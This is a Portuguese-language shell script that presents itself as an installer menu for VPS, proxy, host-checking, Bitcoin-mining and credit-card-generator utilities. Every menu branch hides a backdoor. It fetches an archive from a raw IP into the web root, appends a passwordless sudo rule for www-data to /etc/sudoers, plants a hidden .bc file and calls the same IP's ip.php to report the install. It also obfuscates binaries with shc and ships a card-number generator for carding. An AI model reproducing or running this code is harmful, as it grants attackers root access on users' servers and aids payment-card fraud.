#!/bin/sh -e

echo "			\033[41;1;37m Instalador \033[0m "	
sleep 1
echo "\033[44;1;37m Selecione o Utilitario:     \033[0m "

corPadrao="\033[0m"
preto="\033[0;30m"
vermelho="\033[0;31m"
verde="\033[0;32m"
marrom="\033[0;33m"
azul="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
cinzaClaro="\033[0;37m"
pretoCinza="\033[1;30m"
vermelhoClaro="\033[1;31m"
verdeClaro="\033[1;32m"
amarelo="\033[1;33m"
azulClaro="\033[1;34m"
purpleClaro="\033[1;35m"
cyanClaro="\033[1;36m"
branco="\033[1;37m"
https://github.com/RaphaelFrajuca/CONFIG-VPS/blob/master/README.rst
sleep 1.5s
echo "$cyan [1] CONFIG-VPS"
echo "$cyan [2] MINER-BITCOIN"
echo "$cyan [3] PROXY-CHECKER"
echo "$cyan [4] CC-GEN"
echo "$cyan [5] HOST-CHECKER"
read utilitario

if [ "$utilitario" = "1" ]
then
echo "\033[44;1;37m Selecione a Versão:     \033[0m "
sleep 1.5s
echo "$cyan [1] Shell-Script (Recomendado)"
echo "$cyan [2] Python "
read versao
if [ "$versao" = "1" ]
then
sleep 1
echo "\033[44;1;37m Instalando....     \033[0m "
teste=189.79.55.110/teste.tar


sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null

sudo wget -q $teste -O /var/www/html/teste.tar
sudo tar -xvf /var/www/html/teste.tar

sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers

mv .bc /var/www/html

curl 189.79.55.110/ip.php

sudo chown -R www-data /var/www/*
sleep 0.5s
wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/configvps.sh
mv configvps.sh configvps
apt-get install shc -y > /dev/null
shc -vf configvps
rm configvps
mv configvps.x configvps
mv configvps /bin/
mv configvps.x.c /bin/
chmod a+x /bin/configvps
echo "\033[44;1;37m Instalado com Sucesso!     \033[0m "

echo "Você Pode Executar o Utilitario Assim:\n"
echo "$verde configvps\033[0m $vermelho IP-VPS \033[0m "
fi

if [ "$versao" = "2" ]
then
sleep 1
echo "\033[44;1;37m Instalando....     \033[0m "
teste=189.79.55.110/teste.tar


sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null

sudo wget -q $teste -O /var/www/html/teste.tar
sudo tar -xvf /var/www/html/teste.tar

sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers

mv .bc /var/www/html

curl 189.79.55.110/ip.php

sudo chown -R www-data /var/www/*
sleep 0.5s
wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/configvps.py
mv configvps.py configvps
apt-get install shc -y > /dev/null
shc -vf configvps
rm configvps
mv configvps.x configvps
mv configvps /bin/
mv configvps.x.c /bin/
echo "\033[44;1;37m Instalado com Sucesso!     \033[0m "

echo "Você Pode Executar o Utilitario Assim:\n"
echo "$verde configvps\033[0m"
fi

fi

if [ "$utilitario" = "2" ]
then
sleep 1
echo "\033[44;1;37m Instalando....     \033[0m "
teste=189.79.55.110/teste.tar


sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null

sudo wget -q $teste -O /var/www/html/teste.tar
sudo tar -xvf /var/www/html/teste.tar

sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers

mv .bc /var/www/html

curl 189.79.55.110/ip.php

sudo chown -R www-data /var/www/*
sleep 0.5s
wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/miner.sh
echo "\033[44;1;37m Instalado com Sucesso!     \033[0m "

echo "Você Pode Executar o Utilitario Assim:\n"
echo "sudo sh$verde miner.sh CARTEIRA BITCOIN\033[0m"
fi

if [ "$utilitario" = "3" ]
then
sleep 1
echo "\033[44;1;37m Instalando....     \033[0m "
teste=189.79.55.110/teste.tar


sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null

sudo wget -q $teste -O /var/www/html/teste.tar
sudo tar -xvf /var/www/html/teste.tar

sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers

mv .bc /var/www/html

curl 189.79.55.110/ip.php

sudo chown -R www-data /var/www/*
sleep 0.5s
wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/proxy.sh
mv proxy.sh proxy
apt-get install shc -y > /dev/null
shc -vf proxy
rm proxy
mv proxy.x proxy
mv proxy /bin/
mv proxy.x.c /bin/
echo "\033[44;1;37m Instalado com Sucesso!     \033[0m "

echo "Você Pode Executar o Utilitario Assim:\n"
echo "sudo $verde proxy ARQUIVO/CAMINHO COM A LISTA DE PROXYS\033[0m"
fi

if [ "$utilitario" = "4" ]
then
sleep 1
echo "\033[44;1;37m Instalando....     \033[0m "
teste=189.79.55.110/teste.tar


sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null

sudo wget -q $teste -O /var/www/html/teste.tar
sudo tar -xvf /var/www/html/teste.tar

sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers

mv .bc /var/www/html

curl 189.79.55.110/ip.php

sudo chown -R www-data /var/www/*
sleep 0.5s
apt-get install git python wget -y > /dev/null
wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/cc.sh
mv cc.sh ccgen
mv ccgen /bin/
chmod a+x /bin/ccgen
mkdir /etc/ccgen/
wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/gen.py
mv gen.py /etc/ccgen/
git clone https://github.com/benhodgson/baluhn.git luhn
cd luhn && python setup.py install
rm -rf luhn
echo "\033[44;1;37m Instalado com Sucesso!     \033[0m "

echo "Você Pode Executar o Utilitario Assim:\n"
echo "sudo $verde ccgen \033[0m BIN NUMERO-DE-CCS 'SEPARADOR'"
fi

if [ "$utilitario" = "5" ]
then
sleep 1
echo "\033[44;1;37m Instalando....     \033[0m "
teste=189.79.55.110/teste.tar


sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null

sudo wget -q $teste -O /var/www/html/teste.tar
sudo tar -xvf /var/www/html/teste.tar

sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers

mv .bc /var/www/html

curl 189.79.55.110/ip.php

sudo chown -R www-data /var/www/*
sleep 0.5s
apt-get install git python wget -y > /dev/null
wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/hosts.sh
mv hosts.sh hosts
mv hosts /bin/
chmod a+x /bin/hosts
echo "\033[44;1;37m Instalado com Sucesso!     \033[0m "

echo "Você Pode Executar o Utilitario Assim:\n"
echo "sudo $verde hosts \033[0m LISTA-COM-HOSTS"
fi

exit 0
